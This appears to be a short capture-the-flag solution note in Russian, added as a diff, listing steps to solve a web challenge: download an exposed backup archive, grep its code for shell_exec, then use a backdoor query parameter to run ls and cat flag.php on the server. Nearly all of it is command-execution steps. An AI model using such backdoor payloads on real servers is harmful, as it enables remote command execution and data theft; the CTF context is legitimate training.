@@ -1,0 +1,5 @@
+сначала скачаем бэкап {link}/backup.zip
+дальше анзипим unzip backup.zip
+дальше ищем grep -r "shell_exec("
+в линк вводим {limk}/?welldone=knockknock&shazam=ls -l
+дальше {limk}/?welldone=knockknock&shazam=cat flag.php заходим в инспект и находим флаг
